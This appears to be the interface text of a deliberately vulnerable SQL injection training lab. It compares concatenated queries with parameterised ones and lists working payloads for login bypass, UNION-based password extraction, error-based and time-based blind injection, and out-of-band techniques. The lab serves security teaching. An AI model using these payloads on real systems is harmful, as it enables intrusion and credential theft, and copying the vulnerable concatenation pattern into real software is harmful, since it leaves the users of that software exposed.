SQL Injection playground

This app stores username, email, and password in PostgreSQL and queries them with raw SQL. The left column concatenates input into SQL (vulnerable). The right column uses parameterised queries (secure).

Goal: extract passwords via injection. Start with the vulnerable Search form and a UNION payload.

Vulnerable (string concatenation)

1. Login

Auth bypass: admin'-- with any password, or ' OR '1'='1'--

2. Search user (in-band / UNION / error-based)

Steal passwords: ' UNION SELECT username, password FROM users--

Error-based probe: ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

3. Existence check (boolean / time-based blind)

Boolean: compare response text (found vs not found).

Time-based: admin' AND pg_sleep(5)--

Out-of-band (OOB) notes

OOB attacks force the database to contact an attacker-controlled host (DNS/HTTP). A listener is running at http://localhost:9999 (container: listener).

In PostgreSQL, true OOB usually needs privileged features such as COPY … TO PROGRAM, dblink, or foreign data wrappers — often disabled. See docs/01-SQL-Injection-Types.md and docs/03-Exploitation-Walkthrough.md for payloads and a safe lab exercise against the listener.
